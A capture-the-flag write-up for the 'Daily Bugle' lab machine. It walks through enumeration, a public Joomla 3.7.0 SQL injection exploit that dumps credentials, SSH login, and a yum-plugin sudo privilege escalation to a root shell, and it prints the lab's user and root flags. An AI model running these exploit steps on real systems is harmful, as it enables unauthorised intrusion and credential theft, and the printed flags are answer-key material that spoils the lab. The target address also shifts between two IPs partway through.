# Daily Bugle - Writeup

## Objective

Capture the user and root flags by exploiting a vulnerable Joomla installation and escalating privileges on the target machine.

---

# Enumeration

## Nmap Scan

### Full Port Scan

```bash
nmap -p- 10.48.180.74
```

### Result

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

---

### Service Enumeration

```bash
nmap -sC -sV -p22,80,3306 10.48.180.74
```

### Result

```text
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB

HTTP Title: Home
Generator: Joomla! - Open Source Content Management
```

### Interesting Findings

* Joomla CMS detected
* Apache 2.4.6
* PHP 5.6.40
* MariaDB running on port 3306

---

# Web Enumeration

## Robots.txt

Browsing the website revealed the robber's name:

```text
SpiderMan
```

Checking `robots.txt` showed several Joomla directories.

---

## Gobuster Scan

```bash
gobuster dir -u http://10.48.180.74 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html
```

### Interesting Results

```text
/administrator
/configuration.php
/README.txt
/robots.txt
```

---

## Joomla Version Discovery

Visiting:

```text
http://10.48.180.74/README.txt
```

revealed:

```text
Joomla Version 3.7.0
```

The administrator login page was available at:

```text
/administrator
```

---

# Exploitation

## Search for Public Exploit

```bash
searchsploit joomla 3.7.0
```

A known SQL Injection vulnerability exists in Joomla 3.7.0.

---

## Download Exploit

```bash
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
```

---

## Dump Joomla Credentials

```bash
python joomblah.py http://10.49.138.252
```

### Output

```text
jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

---

## Crack the Hash

Using an online hash cracking service, the password was recovered:

```text
Username: jonah
Password: spiderman123
```

The clue discovered earlier ("SpiderMan") helped validate the password.

---

# Initial Access

During enumeration, additional credentials were discovered:

```text
Username: jjameson
Password: nv5uz9r3ZEDzVjNu
```

---

## SSH Login

```bash
ssh jjameson@10.49.138.252
```

After entering the password:

```text
nv5uz9r3ZEDzVjNu
```

access was obtained.

---

# User Flag

```bash
ls
cat user.txt
```

### Output

```text
27a260fe3cba712cfdedb1c86d80442e
```

**User Flag**

```text
27a260fe3cba712cfdedb1c86d80442e
```

---

# Privilege Escalation

## Check Sudo Permissions

```bash
sudo -l
```

### Output

```text
User jjameson may run the following commands on dailybugle:

(ALL) NOPASSWD: /usr/bin/yum
```

The user can execute `yum` as root without a password.

---

## GTFOBins - Yum Privilege Escalation

Reference:

https://gtfobins.github.io/gtfobins/yum/

---

### Create Temporary Directory

```bash
TF=$(mktemp -d)
```

---

### Create Yum Configuration

```bash
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
```

---

### Create Plugin Configuration

```bash
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
```

---

### Create Malicious Plugin

```bash
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE

requires_api_version='2.1'

def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
EOF
```

---

### Execute Yum as Root

```bash
sudo yum -c $TF/x --enableplugin=y
```

### Result

```text
Loaded plugins: y
sh-4.2#
```

Verify privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root access successfully obtained.

---

# Root Flag

```bash
cd /root
ls
cat root.txt
```

### Output

```text
eec3d53292b1821868266858d7fa6f79
```

**Root Flag**

```text
eec3d53292b1821868266858d7fa6f79
```

---

# Attack Path Summary

1. Enumerated open ports using Nmap.
2. Identified Joomla CMS running on Apache.
3. Discovered Joomla version 3.7.0 through README.txt.
4. Exploited Joomla SQL Injection vulnerability using `joomblah.py`.
5. Retrieved Joomla user credentials.
6. Used discovered credentials to gain SSH access as `jjameson`.
7. Retrieved user flag.
8. Enumerated sudo permissions.
9. Found `yum` executable allowed with `NOPASSWD`.
10. Abused Yum plugin loading feature to spawn a root shell.
11. Retrieved root flag.

---

# Flags

## User Flag

```text
27a260fe3cba712cfdedb1c86d80442e
```

## Root Flag

```text
eec3d53292b1821868266858d7fa6f79
```

---

# Lessons Learned

* Always inspect `README.txt`, `robots.txt`, and CMS-specific files.
* Version disclosure can quickly lead to public exploits.
* Joomla 3.7.0 is vulnerable to SQL Injection.
* Credential reuse is common and can lead to system access.
* Misconfigured sudo permissions are a frequent privilege escalation vector.
* GTFOBins is an excellent resource for Linux privilege escalation techniques.
